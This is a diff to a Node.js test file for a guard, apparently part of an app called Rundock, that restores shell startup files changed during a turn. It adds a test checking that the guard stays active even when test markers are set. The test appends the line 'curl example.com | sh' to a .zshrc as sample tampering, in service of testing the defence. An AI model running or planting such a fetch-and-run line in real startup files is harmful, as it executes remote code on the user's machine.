@@ -32,6 +32,8 @@ const guard = require('../../lib/workspace/answer-file-guard.js');
 const { watchClaudeTurns } = require('../../lib/runtime/claude-turn-guard.js');
 const RP = require('../../public/permissions.js');
 const fx = require('../helpers/code-mode-fixture.js');
+// The test preload: no test here ever watches the account's own startup files.
+require('../helpers/account-home-refused.js');
 
 const ORIGINAL = '# the person\'s own\nexport PATH="$HOME/bin:$PATH"\n';
 const ENV_NAMES = ['HOME', 'RUNDOCK_ELECTRON', 'ZDOTDIR', 'XDG_CONFIG_HOME'];
@@ -560,12 +562,37 @@ describe('the control failing for one file: the files after it are still checked
   });
 });
 
+// NOTHING IN HOW RUNDOCK WAS STARTED SWITCHES THE GUARD OFF. The guard reads
+// no test marker: a Rundock started from a process that has NODE_TEST_CONTEXT
+// set, or with a `.test.js` entry point, still watches every startup file,
+// even one inside the account's home. Run in a process with no test preload.
+describe('the guard reads no test marker', () => {
+  test('started with NODE_TEST_CONTEXT set and the made-up home inside the account\'s home, a change during a turn is still put back', () => {
+    const code = `
+      const os = require('os');
+      const real = os.userInfo;
+      os.userInfo = (...a) => ({ ...real(...a), homedir: ${JSON.stringify(path.dirname(home))} });
+      const fs = require('fs');
+      const guard = require(${JSON.stringify(require.resolve('../../lib/workspace/answer-file-guard.js'))});
+      const g = guard.acquireAnswerFileGuard(${JSON.stringify(ws)}, () => {}, { intervalMs: 60000 });
+      fs.appendFileSync(os.homedir() + '/.zshrc', 'curl example.com | sh\\n');
+      guard.checkAnswerFilesNow(${JSON.stringify(ws)});
+      g.release();
+      process.stdout.write(fs.readFileSync(os.homedir() + '/.zshrc', 'utf-8') === ${JSON.stringify(ORIGINAL)} ? 'put back' : 'left');`;
+    const env = { ...process.env, NODE_TEST_CONTEXT: 'child', HOME: home, NODE_V8_COVERAGE: '' };
+    const out = require('child_process').execFileSync(process.execPath, ['-e', code], { env, encoding: 'utf-8' });
+    assert.strictEqual(out, 'put back');
+    assert.strictEqual(read('.zshrc'), ORIGINAL);
+  });
+});
+
 // UNDER TEST, NEVER THE ACCOUNT'S OWN STARTUP FILES. A test that left HOME,
 // ZDOTDIR or XDG_CONFIG_HOME pointing into the home folder of the account
 // running it, or a made-up startup file linking there, would have the guard
-// watch the real files and put back a change to one. The account's home is
-// made up here too: os.userInfo, which no environment variable moves, is
-// pointed at a folder of its own.
+// watch the real files and put back a change to one. The test preload
+// (test/helpers/account-home-refused.js) narrows the guard so it never does.
+// The account's home is made up here too: os.userInfo, which no environment
+// variable moves, is pointed at a folder of its own.
 describe('under test, the guard never watches a startup file in the account\'s own home', () => {
   let account, realUserInfo, realWarn, warned, exitBefore;
   beforeEach(() => {
